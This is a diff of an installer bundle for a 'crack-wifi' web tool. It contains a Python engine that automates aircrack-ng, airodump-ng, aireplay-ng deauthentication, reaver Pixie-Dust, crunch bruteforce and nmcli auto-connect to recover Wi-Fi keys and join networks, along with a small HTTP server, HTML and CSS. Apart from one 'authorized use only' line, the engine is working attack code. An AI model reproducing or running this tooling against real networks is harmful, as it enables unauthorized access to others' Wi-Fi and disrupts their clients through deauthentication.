         job.result = {"key": secret, "user": user, "method": method,
-                      "connected": connected, "connect_cmd": cmd,
-                      "note": "Recovered in demo mode."}
+                      "connected": connected, "connect_cmd": cmd, "note": "Recovered in demo mode."}
         return self._finish(job, "success")
 
     def _finish(self, job, status):
@@ -736,9 +548,6 @@ class DemoEngine(BaseEngine):
         return status
 
 
-# ---------------------------------------------------------------------------
-# REAL engine (aircrack-ng suite)
-# ---------------------------------------------------------------------------
 class RealEngine(BaseEngine):
     mode = "real"
 
@@ -748,7 +557,6 @@ class RealEngine(BaseEngine):
         os.makedirs(self.workdir, exist_ok=True)
         self.mon_iface = None
 
-    # -- helpers ----------------------------------------------------------
     def _run(self, cmd, timeout=None):
         return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
 
@@ -774,7 +582,6 @@ class RealEngine(BaseEngine):
         job.emit("monitor", f"Monitor interface {mon} is up.", "success")
         return mon
 
-    # -- scanning ---------------------------------------------------------
     def scan(self, duration=8):
         ifaces = self._wireless_ifaces()
         mon = next((i for i in ifaces if i.endswith("mon")), None)
@@ -792,8 +599,7 @@ class RealEngine(BaseEngine):
                 except OSError: pass
 
         proc = subprocess.Popen(
-            ["airodump-ng", "--write-interval", "1", "--output-format", "csv",
-             "-w", prefix, mon],
+            ["airodump-ng", "--write-interval", "1", "--output-format", "csv", "-w", prefix, mon],
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(duration)
         proc.terminate()
@@ -803,7 +609,6 @@ class RealEngine(BaseEngine):
         csvs = _glob(prefix, "csv")
         nets = _parse_airodump_csv(csvs[0]) if csvs else []
 
-        # Enrich with WPS status (airodump CSV doesn't expose it) using wash.
         wps = self._wps_bssids(mon, duration=min(6, duration))
         for n in nets:
             if n["bssid"].upper() in wps:
@@ -815,13 +620,11 @@ class RealEngine(BaseEngine):
         return nets
 
     def _wps_bssids(self, mon, duration=6):
-        """Return the set of WPS-enabled BSSIDs (uppercase) seen by wash."""
         if not shutil.which("wash"):
             return set()
         try:
-            proc = subprocess.Popen(["wash", "-i", mon],
-                                    stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
-                                    text=True)
+            proc = subprocess.Popen(["wash", "-i", mon], stdout=subprocess.PIPE,
+                                    stderr=subprocess.DEVNULL, text=True)
             time.sleep(duration)
             proc.terminate()
             try:
@@ -838,11 +641,7 @@ class RealEngine(BaseEngine):
                 found.add(m.group(1).upper())
         return found
 
-    # -- connecting (leave monitor mode, join the network for real) -------
     def _restore_managed(self, job=None):
-        """Stop monitor interfaces and bring NetworkManager back up.
-        airmon-ng check kill stops NetworkManager, so we must restart it
-        before we can associate with a network."""
         for i in self._wireless_ifaces():
             if i.endswith("mon"):
                 self._run(["airmon-ng", "stop", i])
@@ -856,7 +655,6 @@ class RealEngine(BaseEngine):
         time.sleep(3)
 
     def _connect(self, job, ssid, key=None):
-        """Actually join the network via nmcli. Returns (connected, shown_cmd)."""
         shown = (f"nmcli dev wifi connect '{ssid}' password '{key}'" if key
                  else f"nmcli dev wifi connect '{ssid}'")
         if not shutil.which("nmcli"):
@@ -875,25 +673,21 @@ class RealEngine(BaseEngine):
             job.emit("connect", f"Connect error: {e}. Run manually: {shown}", "warn")
             return False, shown
         out = ((r.stdout or "") + (r.stderr or "")).lower()
-        ok = "successfully activated" in out or (r.returncode == 0 and "error" not in out)
-        if ok:
+        joined = "successfully activated" in out or (r.returncode == 0 and "error" not in out)
+        if joined:
             job.emit("connect", f"Connected to {ssid}. You are on the network.", "success")
         else:
             job.emit("connect", f"Auto-connect failed. Run manually: {shown}", "warn")
-        return ok, shown
+        return joined, shown
 
     def _resolve_wordlist(self, job, wl):
-        """If wl is an http(s) URL, download it into the workdir (with a progress
-        bar) and return the local path. Local paths pass through unchanged.
-        Downloads are cached by filename so re-runs this session never re-fetch."""
         if not (isinstance(wl, str) and wl.lower().startswith(("http://", "https://"))):
             return wl
         import urllib.request
         name = wl.rstrip("/").split("/")[-1] or "wordlist.txt"
         dest = os.path.join(self.workdir, name)
         if os.path.exists(dest) and os.path.getsize(dest) > 0:
-            job.emit("download", f"Using cached wordlist {name} (downloaded earlier this session).",
-                     "success", pct=100)
+            job.emit("download", f"Using cached wordlist {name}.", "success", pct=100)
             return dest
         job.emit("download", f"Fetching wordlist from the internet: {wl}", pct=0)
         try:
@@ -918,12 +712,10 @@ class RealEngine(BaseEngine):
         except Exception as e:
             job.emit("download", f"Wordlist download failed: {e}", "error")
             return None
-        job.emit("download", f"Saved {name} ({read:,} bytes) — using it for the dictionary attack.",
-                 "success", pct=100)
+        job.emit("download", f"Saved {name} ({read:,} bytes).", "success", pct=100)
         return dest
 
     def _succeed(self, job, net, key, method, note, opts, user=None):
-        """Record a recovered key and optionally join the network."""
         if key:
             job.emit("done", f"KEY FOUND: {key}", "success")
         connected, cmd = (False, None)
@@ -933,7 +725,6 @@ class RealEngine(BaseEngine):
                       "connected": connected, "connect_cmd": cmd, "note": note}
         return self._finish(job, "success")
 
-    # -- attack -----------------------------------------------------------
     def _run_attack(self, job):
         net = job.network
         opts = job.options
@@ -943,7 +734,6 @@ class RealEngine(BaseEngine):
 
         job.emit("init", f"Target: {net.get('ssid')} ({bssid}) ch {ch} {enc}.")
 
-        # --- Open network: just join it -------------------------------------
         if enc.startswith("OPEN") or enc == "OPN":
             job.emit("join", "Open network — no key required.")
             connected, cmd = (False, None)
@@ -957,7 +747,6 @@ class RealEngine(BaseEngine):
         mon = self._ensure_monitor(job)
         if job.stopped(): return self._finish(job, "stopped")
 
-        # --- WEP: capture IVs and recover the key ---------------------------
         if enc == "WEP":
             wep_prefix = os.path.join(self.workdir, "wep_" + bssid.replace(":", ""))
             for f in _glob(wep_prefix, "cap"):
@@ -965,10 +754,8 @@ class RealEngine(BaseEngine):
                 except OSError: pass
             job.emit("capture", f"Collecting WEP IVs on channel {ch} (airodump-ng).")
             dump = subprocess.Popen(
-                ["airodump-ng", "-c", str(ch), "--bssid", bssid, "-w", wep_prefix,
-                 "--output-format", "cap", mon],
+                ["airodump-ng", "-c", str(ch), "--bssid", bssid, "-w", wep_prefix, "--output-format", "cap", mon],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            # Speed things up with an ARP-replay injection (best effort).
             self._run(["aireplay-ng", "--arpreplay", "-b", bssid, mon], timeout=10)
             key = None
             try:
@@ -989,16 +776,14 @@ class RealEngine(BaseEngine):
                 except subprocess.TimeoutExpired: dump.kill()
             if job.stopped(): return self._finish(job, "stopped")
             if key:
-                return self._succeed(job, net, key, "wep-iv",
-                                     "Recovered WEP key from captured IVs.", opts)
+                return self._succeed(job, net, key, "wep-iv", "Recovered WEP key from captured IVs.", opts)
             job.emit("crack", "Could not gather enough IVs for the WEP key.", "error")
             return self._finish(job, "failed")
 
-        # --- WPS Pixie-Dust -------------------------------------------------
         if net.get("wps") and opts.get("method") in (None, "auto", "wps-pixie") and shutil.which("reaver"):
             job.emit("wps", f"WPS enabled — reaver Pixie-Dust on {bssid}.")
-            r = self._run(["reaver", "-i", mon, "-b", bssid, "-c", str(ch),
-                           "-K", "1", "-N"], timeout=opts.get("wps_timeout", 180))
+            r = self._run(["reaver", "-i", mon, "-b", bssid, "-c", str(ch), "-K", "1", "-N"],
+                          timeout=opts.get("wps_timeout", 180))
             m = re.search(r"WPA PSK:\s*'([^']*)'", r.stdout or "")
             pin = re.search(r"WPS PIN:\s*'?(\d+)", r.stdout or "")
             if m:
@@ -1010,12 +795,10 @@ class RealEngine(BaseEngine):
             job.emit("crack", "WPA3-SAE — no practical offline attack.", "error")
             return self._finish(job, "failed")
 
-        # --- WPA/WPA2: capture the 4-way handshake (or reuse a cached one) ---
         cap_prefix = os.path.join(self.workdir, "hs_" + bssid.replace(":", ""))
         cached = _glob(cap_prefix, "cap")
         if bssid in self.handshakes and cached and _has_handshake(cached[0], bssid):
-            job.emit("capture", "Reusing the handshake captured earlier this session "
-                                "— skipping capture.", "success")
+            job.emit("capture", "Reusing the handshake captured earlier this session.", "success")
             caps = cached
         else:
             for f in cached:
@@ -1023,12 +806,11 @@ class RealEngine(BaseEngine):
                 except OSError: pass
             job.emit("capture", f"Capturing handshake on channel {ch} (airodump-ng).")
             dump = subprocess.Popen(
-                ["airodump-ng", "-c", str(ch), "--bssid", bssid, "-w", cap_prefix,
-                 "--output-format", "cap", mon],
+                ["airodump-ng", "-c", str(ch), "--bssid", bssid, "-w", cap_prefix, "--output-format", "cap", mon],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            got = False
             try:
                 deadline = time.time() + opts.get("capture_timeout", 90)
-                got = False
                 while time.time() < deadline and not job.stopped():
                     job.emit("deauth", f"Sending deauth to {bssid} (aireplay-ng --deauth 5).")
                     self._run(["aireplay-ng", "--deauth", "5", "-a", bssid, mon], timeout=15)
@@ -1041,29 +823,25 @@ class RealEngine(BaseEngine):
                 dump.terminate()
                 try: dump.wait(timeout=3)
                 except subprocess.TimeoutExpired: dump.kill()
-
             if job.stopped(): return self._finish(job, "stopped")
             caps = _glob(cap_prefix, "cap")
             if not caps or not got:
                 job.emit("capture", "Could not capture a handshake in time.", "error")
                 return self._finish(job, "failed")
-            self.handshakes.add(bssid)   # remember it for the rest of the session
+            self.handshakes.add(bssid)
             job.emit("capture", "Handshake captured.", "success")
 
-        # --- Crack the handshake --------------------------------------------
         wl = opts.get("wordlist") or self.wordlist
         if opts.get("bruteforce") or opts.get("method") == "handshake+bruteforce":
             charset = {"digits": "0123456789",
                        "lower": "abcdefghijklmnopqrstuvwxyz",
-                       "alnum": "abcdefghijklmnopqrstuvwxyz0123456789"}.get(
-                           opts.get("charset", "digits"), "0123456789")
+                       "alnum": "abcdefghijklmnopqrstuvwxyz0123456789"}.get(opts.get("charset", "digits"), "0123456789")
             length = int(opts.get("length", 8))
             job.emit("crack", f"Bruteforce via crunch | aircrack-ng ({charset[:6]}..., len {length}).")
             if not shutil.which("crunch"):
                 job.emit("crack", "crunch not installed (apt install crunch).", "error")
                 return self._finish(job, "failed")
-            crunch = subprocess.Popen(["crunch", str(length), str(length), charset],
-                                      stdout=subprocess.PIPE)
+            crunch = subprocess.Popen(["crunch", str(length), str(length), charset], stdout=subprocess.PIPE)
             r = subprocess.run(["aircrack-ng", "-b", bssid, "-w", "-", caps[0]],
                                stdin=crunch.stdout, capture_output=True, text=True)
             crunch.terminate()
@@ -1077,14 +855,12 @@ class RealEngine(BaseEngine):
                 job.emit("crack", f"Wordlist not found: {wl}", "error")
                 return self._finish(job, "failed")
             job.emit("crack", f"Dictionary attack (aircrack-ng -w {os.path.basename(wl)}).", pct=0)
-            r = self._run(["aircrack-ng", "-b", bssid, "-w", wl, caps[0]],
-                          timeout=opts.get("crack_timeout", 3600))
+            r = self._run(["aircrack-ng", "-b", bssid, "-w", wl, caps[0]], timeout=opts.get("crack_timeout", 3600))
             key = _parse_aircrack_key(r.stdout)
             method = "handshake+dictionary"
 
         if key:
-            return self._succeed(job, net, key, method,
-                                 "Recovered from captured handshake.", opts)
+            return self._succeed(job, net, key, method, "Recovered from captured handshake.", opts)
         job.emit("crack", "Key not found with the given wordlist/keyspace.", "error")
         return self._finish(job, "failed")
 
@@ -1095,16 +871,12 @@ class RealEngine(BaseEngine):
         return status
 
 
-# ---------------------------------------------------------------------------
-# parsing helpers
-# ---------------------------------------------------------------------------
 def _glob(prefix, ext):
     import glob
     return sorted(glob.glob(f"{prefix}*-*.{ext}") + glob.glob(f"{prefix}*.{ext}"))
 
 
 def _parse_airodump_csv(path):
-    """Parse airodump-ng CSV into a list of network dicts (AP section + clients)."""
     try:
         with open(path, "r", errors="ignore") as fh:
             content = fh.read()
@@ -1115,7 +887,6 @@ def _parse_airodump_csv(path):
     if "Station MAC" in content:
         ap_block, client_block = content.split("Station MAC", 1)
 
-    # Count clients per BSSID.
     client_counts = {}
     for line in client_block.splitlines():
         parts = [p.strip() for p in line.split(",")]
@@ -1159,7 +930,7 @@ def _parse_airodump_csv(path):
             "channel": channel,
             "signal": signal,
             "clients": client_counts.get(bssid, 0),
-            "wps": False,   # airodump CSV doesn't expose WPS; wash could enrich this
+            "wps": False,
         })
     return nets
 
@@ -1172,10 +943,8 @@ def _parse_aircrack_key(out):
 
 
 def _has_handshake(cap_path, bssid):
-    """Best-effort handshake check using aircrack-ng's own summary."""
     try:
-        r = subprocess.run(["aircrack-ng", cap_path], capture_output=True,
-                           text=True, timeout=20)
+        r = subprocess.run(["aircrack-ng", cap_path], capture_output=True, text=True, timeout=20)
     except Exception:
         return False
     for line in r.stdout.splitlines():
@@ -1184,9 +953,6 @@ def _has_handshake(cap_path, bssid):
     return "handshake" in (r.stdout or "").lower()
 
 
-# ---------------------------------------------------------------------------
-# factory
-# ---------------------------------------------------------------------------
 def build_engine(mode, wordlist=None):
     if mode == "real":
         return RealEngine(wordlist=wordlist)
@@ -1195,25 +961,6 @@ CRACK_EOF_ENGINE
 
   cat > "${BUNDLE}/server/server.py" <<'CRACK_EOF_SERVER'
 #!/usr/bin/env python3
-"""
-server.py — tiny stdlib HTTP server for the crack-wifi web interface.
-
-No third-party dependencies. Serves the static UI from CRACK_WEBROOT and exposes
-a small JSON API backed by lib/engine.py.
-
-API:
-    GET  /api/status                      -> {mode, wordlist, hostname}
-    GET  /api/scan                        -> {networks: [...]}
-    POST /api/attack   {bssid, options}   -> {job_id}
-    GET  /api/attack?id=..&since=N        -> job snapshot (events since N)
-    POST /api/attack/stop  {id}           -> {stopped: bool}
-
-Environment:
-    CRACK_MODE      demo|real   (default demo)
-    CRACK_WORDLIST  path to default wordlist
-    CRACK_WEBROOT   directory holding index.html/style.css/app.js
-"""
-
 import os
 import sys
 import json
@@ -1221,12 +968,11 @@ import argparse
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from urllib.parse import urlparse, parse_qs
 
-# Make lib/ importable regardless of CWD.
 HERE = os.path.dirname(os.path.abspath(__file__))
 ROOT = os.path.dirname(HERE)
 sys.path.insert(0, os.path.join(ROOT, "lib"))
 
-import engine as engine_mod   # noqa: E402
+import engine as engine_mod
 
 MODE = os.environ.get("CRACK_MODE", "demo")
 WORDLIST = os.environ.get("CRACK_WORDLIST") or None
@@ -1245,11 +991,9 @@ _STATIC = {
 class Handler(BaseHTTPRequestHandler):
     server_version = "crack-wifi/1.0"
 
-    # keep the console clean
     def log_message(self, fmt, *args):
         pass
 
-    # -- helpers ----------------------------------------------------------
     def _send_json(self, obj, code=200):
         body = json.dumps(obj).encode("utf-8")
         self.send_response(code)
@@ -1282,7 +1026,6 @@ class Handler(BaseHTTPRequestHandler):
         except json.JSONDecodeError:
             return {}
 
-    # -- routing ----------------------------------------------------------
     def do_GET(self):
         parsed = urlparse(self.path)
         route = parsed.path
@@ -1292,16 +1035,12 @@ class Handler(BaseHTTPRequestHandler):
             return self._send_static(fname, ctype)
 
         if route == "/api/status":
-            return self._send_json({
-                "mode": ENGINE.mode,
-                "wordlist": WORDLIST,
-                "hostname": self.headers.get("Host", "crack-wifi.local"),
-            })
+            return self._send_json({"mode": ENGINE.mode, "wordlist": WORDLIST})
 
         if route == "/api/scan":
             try:
                 nets = ENGINE.scan()
-            except Exception as e:  # keep the UI alive on scan failure
+            except Exception as e:
                 return self._send_json({"error": str(e), "networks": []}, 500)
             return self._send_json({"networks": nets})
 
@@ -1327,8 +1066,7 @@ class Handler(BaseHTTPRequestHandler):
             options = data.get("options") or {}
             if not bssid:
                 return self._send_json({"error": "missing bssid"}, 400)
-            job_id = ENGINE.start_attack(bssid, options)
-            return self._send_json({"job_id": job_id})
+            return self._send_json({"job_id": ENGINE.start_attack(bssid, options)})
 
         if route == "/api/attack/stop":
             job_id = data.get("id")
@@ -1345,8 +1083,7 @@ def main():
     args = ap.parse_args()
 
     httpd = ThreadingHTTPServer((args.host, args.port), Handler)
-    print(f"[server] crack-wifi UI listening on http://{args.host}:{args.port} "
-          f"(mode={ENGINE.mode})", flush=True)
+    print(f"[server] crack-wifi listening on http://{args.host}:{args.port} (mode={ENGINE.mode})", flush=True)
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
@@ -1364,174 +1101,114 @@ CRACK_EOF_SERVER
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>crack-wifi.local</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>crack-wifi</title>
   <link rel="stylesheet" href="/style.css" />
 </head>
 <body>
   <header class="topbar">
-    <div class="brand">
-      <span class="logo">◈</span>
-      <span class="title">crack-wifi<span class="dim">.local</span></span>
-    </div>
-    <div class="topbar-right">
-      <span id="mode-badge" class="badge badge-demo">demo</span>
-    </div>
+    <div class="brand"><span class="dot"></span> crack-wifi</div>
+    <span id="mode" class="mode">demo</span>
   </header>
 
-  <div class="legal-strip">
-    Authorized use only — audit networks you own or have written permission to test.
-  </div>
+  <p class="notice">Authorized use only — audit networks you own or have written permission to test.</p>
 
-  <main class="layout">
-    <!-- Left: network list -->
-    <section class="panel networks-panel">
-      <div class="panel-head">
+  <main class="grid">
+    <aside class="card networks">
+      <div class="card-head">
         <h2>Networks</h2>
-        <div class="panel-head-right">
-          <span id="net-count" class="muted"></span>
-          <button id="rescan-btn" class="icon-btn" title="Rescan" aria-label="Rescan">&#8635;</button>
-        </div>
+        <button id="rescan" class="icon-btn" title="Rescan" aria-label="Rescan">&#8635;</button>
       </div>
-      <div id="scan-hint" class="empty-state">
-        <p id="scan-hint-title">Scanning for nearby Wi-Fi&hellip;</p>
-        <p class="muted">Networks appear here automatically, easiest to crack first.</p>
-      </div>
-      <ul id="network-list" class="network-list"></ul>
-    </section>
+      <p id="net-status" class="status">Scanning…</p>
+      <ul id="net-list" class="net-list"></ul>
+    </aside>
 
-    <!-- Right: detail / attack console -->
-    <section class="panel detail-panel">
-      <div id="detail-empty" class="empty-state">
-        <p>Select a network</p>
-        <p class="muted">Pick a network on the left to see how hard it is to crack and to start an audit.</p>
-      </div>
+    <section class="card detail">
+      <div id="empty" class="empty">Select a network to see how hard it is and start an audit.</div>
 
-      <div id="detail" class="detail hidden">
+      <div id="detail" class="hidden">
         <div class="detail-head">
-          <div>
-            <h2 id="d-ssid">SSID</h2>
-            <div class="meta-row">
-              <span id="d-bssid" class="mono muted"></span>
-              <span id="d-enc" class="chip"></span>
-              <span id="d-ch" class="chip"></span>
-              <span id="d-signal" class="chip"></span>
-            </div>
+          <h2 id="d-ssid"></h2>
+          <div class="chips">
+            <span id="d-bssid" class="mono muted"></span>
+            <span id="d-enc" class="chip"></span>
+            <span id="d-ch" class="chip"></span>
+            <span id="d-sig" class="chip"></span>
+            <span id="d-wps" class="chip hidden">WPS</span>
           </div>
-          <div class="difficulty">
-            <div class="gauge">
-              <svg viewBox="0 0 120 120" class="gauge-svg">
-                <circle class="gauge-bg" cx="60" cy="60" r="52"></circle>
-                <circle id="gauge-arc" class="gauge-arc" cx="60" cy="60" r="52"></circle>
-              </svg>
-              <div class="gauge-label">
-                <span id="d-score" class="gauge-score">0</span>
-                <span class="gauge-max">/100</span>
-              </div>
-            </div>
-            <div class="difficulty-text">
-              <span id="d-label" class="diff-label">—</span>
-              <span id="d-eta" class="muted"></span>
-            </div>
+        </div>
+
+        <div class="meter">
+          <div class="meter-top">
+            <span id="d-label" class="meter-label">—</span>
+            <span id="d-score" class="mono muted"></span>
           </div>
+          <div class="bar"><div id="d-bar" class="bar-fill"></div></div>
+          <span id="d-eta" class="small muted"></span>
         </div>
 
         <ul id="d-reasons" class="reasons"></ul>
 
-        <!-- Advanced options -->
-        <details class="advanced">
-          <summary>Advanced options</summary>
-          <div class="adv-grid">
-            <label>
-              Method
+        <details class="options">
+          <summary>Options</summary>
+          <div class="opt-grid">
+            <label>Method
               <select id="opt-method">
-                <option value="auto">Auto (recommended)</option>
-                <option value="handshake+dictionary">Handshake + dictionary</option>
-                <option value="handshake+bruteforce">Handshake + bruteforce</option>
+                <option value="auto">Auto</option>
+                <option value="handshake+dictionary">Dictionary</option>
+                <option value="handshake+bruteforce">Bruteforce</option>
                 <option value="wps-pixie">WPS Pixie-Dust</option>
               </select>
             </label>
-            <label>
-              Wordlist
+            <label>Online wordlist
+              <select id="opt-online"><option value="">— local path —</option></select>
+            </label>
+            <label class="wide">Wordlist
               <input id="opt-wordlist" type="text" placeholder="/usr/share/wordlists/rockyou.txt" />
             </label>
-            <label>
-              Online wordlist
-              <select id="opt-online-wordlist">
-                <option value="">&mdash; use local path &mdash;</option>
-              </select>
-            </label>
-            <label>
-              Bruteforce charset
+            <label>Bruteforce charset
               <select id="opt-charset">
-                <option value="digits">Digits (0-9)</option>
-                <option value="lower">Lowercase (a-z)</option>
+                <option value="digits">Digits</option>
+                <option value="lower">Lowercase</option>
                 <option value="alnum">Alphanumeric</option>
               </select>
             </label>
-            <label>
-              Bruteforce length
+            <label>Bruteforce length
               <input id="opt-length" type="number" min="4" max="16" value="8" />
             </label>
-            <label class="checkbox-label">
-              <input id="opt-connect" type="checkbox" checked />
-              Auto-connect to the network when the key is found
-            </label>
+            <label class="check"><input id="opt-connect" type="checkbox" checked /> Auto-connect when the key is found</label>
           </div>
         </details>
 
         <div class="actions">
-          <button id="attack-btn" class="btn btn-danger">Start audit</button>
-          <button id="stop-btn" class="btn btn-ghost hidden">Stop</button>
-          <span id="status-pill" class="pill hidden"></span>
+          <button id="start" class="btn primary">Start audit</button>
+          <button id="stop" class="btn ghost hidden">Stop</button>
+          <span id="pill" class="pill hidden"></span>
         </div>
 
-        <!-- Progress bar -->
-        <div id="progress-wrap" class="progress-wrap hidden">
+        <div id="progress" class="progress hidden">
           <div class="progress-top">
-            <span id="progress-label" class="progress-label">Working</span>
-            <span id="progress-pct" class="progress-pct"></span>
+            <span id="progress-label">Working</span>
+            <span id="progress-pct" class="mono"></span>
           </div>
-          <div class="progress-track">
-            <div id="progress-fill" class="progress-fill"></div>
-          </div>
+          <div class="bar"><div id="progress-bar" class="bar-fill"></div></div>
         </div>
 
-        <!-- Result -->
         <div id="result" class="result hidden">
-          <div class="result-head">Recovered</div>
-          <div class="result-grid">
-            <div class="result-item">
-              <span class="result-key">Network</span>
-              <span id="r-ssid" class="result-val mono"></span>
-            </div>
-            <div class="result-item">
-              <span class="result-key">Password</span>
-              <span id="r-key" class="result-val mono strong"></span>
-            </div>
-            <div id="r-user-row" class="result-item hidden">
-              <span class="result-key">Login</span>
-              <span id="r-user" class="result-val mono"></span>
-            </div>
-            <div class="result-item">
-              <span class="result-key">Method</span>
-              <span id="r-method" class="result-val"></span>
-            </div>
-            <div class="result-item">
-              <span class="result-key">Status</span>
-              <span id="r-status" class="result-val"></span>
-            </div>
-          </div>
-          <div id="r-connect-cmd" class="result-note mono hidden"></div>
-          <div id="r-note" class="result-note muted"></div>
+          <h3>Recovered</h3>
+          <dl>
+            <div><dt>Network</dt><dd id="r-ssid" class="mono"></dd></div>
+            <div><dt>Password</dt><dd id="r-key" class="mono strong"></dd></div>
+            <div id="r-user-row" class="hidden"><dt>Login</dt><dd id="r-user" class="mono"></dd></div>
+            <div><dt>Method</dt><dd id="r-method"></dd></div>
+            <div><dt>Status</dt><dd id="r-status"></dd></div>
+          </dl>
+          <code id="r-cmd" class="cmd hidden"></code>
+          <p id="r-note" class="small muted"></p>
         </div>
 
-        <!-- Live console -->
         <div class="console-wrap">
-          <div class="console-head">
-            <span>Activity</span>
-            <span id="phase-tag" class="phase-tag"></span>
-          </div>
+          <div class="console-head"><span>Activity</span><span id="phase" class="mono muted"></span></div>
           <div id="console" class="console"></div>
         </div>
       </div>
@@ -1544,367 +1221,241 @@ CRACK_EOF_SERVER
 CRACK_EOF_INDEX
 
   cat > "${BUNDLE}/web/style.css" <<'CRACK_EOF_STYLE'
-/* crack-wifi.local — simple, clean dark interface */
 :root {
-  --bg:        #0e1116;
-  --bg-2:      #161b22;
-  --bg-3:      #1c2430;
-  --border:    #2a3441;
-  --text:      #e6edf3;
-  --muted:     #8b98a5;
-  --accent:    #4aa8ff;
-  --accent-2:  #2b7fd4;
-  --danger:    #ff5c5c;
-  --danger-2:  #d63d3d;
-  --ok:        #46d17f;
-  --warn:      #f0b429;
-  --mono: ui-monospace, "SF Mono", "JetBrains Mono", Menlo, Consolas, monospace;
-  --sans: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  --bg: #f5f6f8;
+  --card: #ffffff;
+  --border: #e4e7eb;
+  --text: #1c2126;
+  --muted: #6b7280;
+  --accent: #2563eb;
+  --accent-weak: #eef4ff;
+  --ok: #15803d;
+  --ok-weak: #eaf6ee;
+  --warn: #b45309;
+  --danger: #dc2626;
+  --mono: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace;
+  --sans: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
 }
 
 * { box-sizing: border-box; }
-html, body { height: 100%; }
 body {
   margin: 0;
   background: var(--bg);
   color: var(--text);
   font-family: var(--sans);
   font-size: 14px;
-  line-height: 1.5;
+  line-height: 1.55;
 }
 
 .hidden { display: none !important; }
 .muted { color: var(--muted); }
-.dim { color: var(--muted); font-weight: 400; }
+.small { font-size: 12px; }
 .mono { font-family: var(--mono); }
-.strong { font-weight: 700; }
+.strong { font-weight: 600; }
 
-/* Top bar */
 .topbar {
   display: flex;
   align-items: center;
   justify-content: space-between;
-  padding: 14px 22px;
-  background: var(--bg-2);
+  padding: 14px 24px;
+  background: var(--card);
   border-bottom: 1px solid var(--border);
 }
-.brand { display: flex; align-items: center; gap: 10px; }
-.logo { color: var(--accent); font-size: 20px; }
-.title { font-weight: 600; font-size: 16px; letter-spacing: .2px; }
-.topbar-right { display: flex; align-items: center; gap: 12px; }
-
-.panel-head-right { display: flex; align-items: center; gap: 10px; }
-.icon-btn {
-  background: transparent; color: var(--muted);
-  border: 1px solid var(--border); border-radius: 6px;
-  width: 28px; height: 28px; padding: 0; line-height: 1;
-  font-size: 15px; cursor: pointer;
-  display: inline-flex; align-items: center; justify-content: center;
-  transition: color .12s, border-color .12s, transform .25s;
-}
-.icon-btn:hover { color: var(--text); border-color: var(--muted); }
-.icon-btn.spinning { animation: spin .8s linear infinite; }
-@keyframes spin { to { transform: rotate(360deg); } }
-
-.badge {
+.brand { display: flex; align-items: center; gap: 9px; font-weight: 600; font-size: 16px; }
+.dot { width: 9px; height: 9px; border-radius: 50%; background: var(--accent); }
+.mode {
   font-family: var(--mono);
   font-size: 11px;
   text-transform: uppercase;
-  letter-spacing: .5px;
-  padding: 3px 8px;
-  border-radius: 4px;
-  border: 1px solid var(--border);
+  letter-spacing: .04em;
+  padding: 3px 9px;
+  border-radius: 999px;
+  background: var(--accent-weak);
+  color: var(--accent);
 }
-.badge-demo { color: var(--warn); border-color: #4a3d16; background: #241d0a; }
-.badge-real { color: var(--ok);   border-color: #17422a; background: #0c2417; }
+.mode.real { background: var(--ok-weak); color: var(--ok); }
 
-.legal-strip {
-  background: #241d0a;
+.notice {
+  margin: 0;
+  padding: 8px 24px;
+  font-size: 12.5px;
   color: var(--warn);
-  border-bottom: 1px solid #3a3010;
-  padding: 6px 22px;
-  font-size: 12px;
+  background: #fdf6ec;
+  border-bottom: 1px solid #f3e6cf;
   text-align: center;
 }
 
-/* Buttons */
-.btn {
-  font-family: var(--sans);
-  font-size: 13px;
-  font-weight: 600;
-  padding: 8px 16px;
-  border-radius: 6px;
-  border: 1px solid transparent;
-  cursor: pointer;
-  transition: background .12s, border-color .12s, opacity .12s;
-}
-.btn:disabled { opacity: .5; cursor: not-allowed; }
-.btn-primary { background: var(--accent-2); color: #fff; }
-.btn-primary:hover:not(:disabled) { background: var(--accent); }
-.btn-danger { background: var(--danger-2); color: #fff; }
-.btn-danger:hover:not(:disabled) { background: var(--danger); }
-.btn-ghost { background: transparent; color: var(--muted); border-color: var(--border); }
-.btn-ghost:hover { color: var(--text); border-color: var(--muted); }
-
-/* Layout */
-.layout {
+.grid {
   display: grid;
-  grid-template-columns: 340px 1fr;
-  gap: 24px;
-  padding: 26px 28px 48px;
-  max-width: 1180px;
+  grid-template-columns: 320px 1fr;
+  gap: 20px;
+  max-width: 1080px;
   margin: 0 auto;
+  padding: 24px;
   align-items: start;
 }
-@media (max-width: 820px) {
-  .layout { grid-template-columns: 1fr; padding: 18px 16px 32px; gap: 18px; }
-}
-@media (min-width: 821px) {
-  .networks-panel {
-    position: sticky; top: 24px;
-    max-height: calc(100vh - 48px);
-    display: flex; flex-direction: column;
-  }
-  .networks-panel .network-list { overflow-y: auto; }
-}
+@media (max-width: 780px) { .grid { grid-template-columns: 1fr; padding: 16px; } }
 
-.panel {
-  background: var(--bg-2);
+.card {
+  background: var(--card);
   border: 1px solid var(--border);
-  border-radius: 10px;
-  overflow: hidden;
+  border-radius: 12px;
+  padding: 16px;
 }
-.panel-head {
-  display: flex; align-items: baseline; justify-content: space-between;
-  padding: 14px 16px;
-  border-bottom: 1px solid var(--border);
+.card-head { display: flex; align-items: center; justify-content: space-between; margin-bottom: 6px; }
+.card-head h2 { margin: 0; font-size: 13px; text-transform: uppercase; letter-spacing: .05em; color: var(--muted); }
+
+.icon-btn {
+  width: 30px; height: 30px;
+  display: inline-flex; align-items: center; justify-content: center;
+  border: 1px solid var(--border); border-radius: 8px;
+  background: var(--card); color: var(--muted);
+  font-size: 16px; cursor: pointer;
+  transition: background .12s, color .12s, transform .4s;
 }
-.panel-head h2 { margin: 0; font-size: 14px; text-transform: uppercase; letter-spacing: .6px; color: var(--muted); }
+.icon-btn:hover { background: var(--bg); color: var(--text); }
+.icon-btn.spin { animation: spin .8s linear infinite; }
+@keyframes spin { to { transform: rotate(360deg); } }
 
-.empty-state { padding: 40px 20px; text-align: center; }
